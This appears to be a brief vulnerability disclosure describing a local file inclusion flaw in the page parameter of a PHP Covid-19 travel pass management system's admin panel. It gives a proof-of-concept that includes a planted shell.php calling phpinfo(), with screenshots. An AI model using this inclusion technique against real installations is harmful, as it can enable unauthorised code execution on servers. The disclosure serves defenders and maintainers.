# Covid-19 Travel Pass Management System v1.0 by oretnom23 has The local file contains

vendor : https://www.sourcecodester.com/php/15308/covid-19-travel-pass-management-system-phpoop-free-source-code.html

Vulnerability File: ip/ctpms/admin/?page=

Vulnerability location: ip/ctpms/admin/?page=, page

Payload: ip/ctpms/admin/?page=shell

![image](https://user-images.githubusercontent.com/54017627/167079931-0713d4b7-c1c8-4d48-a58b-466b35b29d89.png)

We create a shell.php under the PHP file of the root of the website, which reads "<?" phpinfo ();? > "

![image](https://user-images.githubusercontent.com/54017627/167079874-6a136cf5-aedc-442d-84e1-271e277be1e4.png)

And visit http://ip/ctpms/admin/?page=shell You can see that phpinfo has been successfully included

![image](https://user-images.githubusercontent.com/54017627/167079965-ac6e6bee-00f6-4901-a454-b4619888f380.png)
